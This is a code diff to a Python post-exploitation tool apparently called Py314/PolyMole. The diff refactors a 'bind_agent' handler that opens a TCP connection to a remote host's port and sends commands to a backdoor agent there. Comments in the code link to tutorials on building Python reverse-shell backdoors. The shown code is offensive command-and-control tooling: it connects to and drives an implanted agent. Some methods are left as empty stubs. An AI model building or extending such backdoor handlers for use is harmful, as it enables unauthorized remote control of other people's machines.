@@ -20,13 +20,29 @@ class Prompt(Cmd):
         'verbose': False
     }
 
+    def emptyline(self):
+        """Called when an empty line is entered in response to the prompt.
+
+        If this method is not overridden, it repeats the last nonempty
+        command entered.
+
+        """
+
     def do_bg(self, arg):
         """Return to Py314 main interpreter"""
         return True
+    
+    def do_channel(self, arg):
+        """Display availables channels to interact with agent"""
+
 
     def do_exit(self, arg):
         """Quit Py314"""
         exit()
+
+    def do_run(self, arg):
+        """Launch handler with defined settings"""
+        bindAgent(self.optionsDict)
 
     def do_set(self, arg):
         """Set value for available option : set <option> <value>"""
@@ -79,6 +95,7 @@ class Prompt(Cmd):
 
 
 
+
         
 
 def startModule():
@@ -87,6 +104,57 @@ def startModule():
     subPrompt = Prompt()
     subPrompt.prompt = f"({colored('bind_agent', 'yellow')}) > "
     subPrompt.cmdloop()
+
+
+def bindAgent(dictionnary):
+
+    host = dictionnary['rhost']
+    port = dictionnary['rport']
+    proxy = dictionnary['proxy']
+    verbose = dictionnary['verbose']
+    
+    try:
+    
+        print(f"[+] Trying to connect to {host}:{port}")
+
+        channel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        channel.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+        channel.connect((host, port))
+        print(f"[+] Connection established to {host}:{port}")
+
+
+        t = threading.Thread(target=sendCommand, daemon=True, args=((channel,)))
+        t.start()
+
+        t.join()
+        channel.close()
+        
+
+    except KeyboardInterrupt:
+        print("Dans bindAgent")
+        choice = input('Do you want to quit PolyMoly channel [y/n] ? :')
+
+        if choice.lower() == 'y':
+            print("\nquitting PolyMole")
+            channel.close()
+            t.join()
+            return
+        elif choice.lower() == 'n':
+            pass
+
+    except ConnectionError:
+        print(f"[!] Can't established connection to {host}")
+        return
+
+    except ConnectionRefusedError as e:
+        print(e)
+        return
+
+    except OSError as error:
+        print(f"[!] {error}")
+        return
+
 
 
 def sendCommand(channel):
@@ -132,59 +200,6 @@ def sendCommand(channel):
 
 
 
-
-
-
-def launchModule():
-
-
-    
-    host = '192.168.1.1'
-    port = 1234
-
-
-
-
-    try:
-    
-        print(f"[+] Trying to connect to {host}:{port}")
-
-        channel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        channel.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-        channel.connect((host, port))
-        print(f"[+] Connection established to {host}:{port}")
-
-
-        t = threading.Thread(target=sendCommand, daemon=True, args=((channel,)))
-        t.start()
-
-        t.join()
-        channel.close()
-        
-
-    except KeyboardInterrupt:
-        print("Dans launchModule")
-        choice = input('Do you want to quit PolyMoly channel [y/n] ? :')
-
-        if choice.lower() == 'y':
-            print("\nquitting PolyMole")
-            channel.close()
-            return
-        elif choice.lower() == 'n':
-            pass
-
-    except ConnectionError:
-        print(f"[!] Can't established connection to {host}")
-        return
-
-    except ConnectionRefusedError as e:
-        print(e)
-        return
-
-    except OSError as error:
-        print(f"[!] {error}")
-        return
 
     # https://www.shellvoide.com/python/how-to-hack-create-shell-backdoor-in-python/
     # https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-1/1038
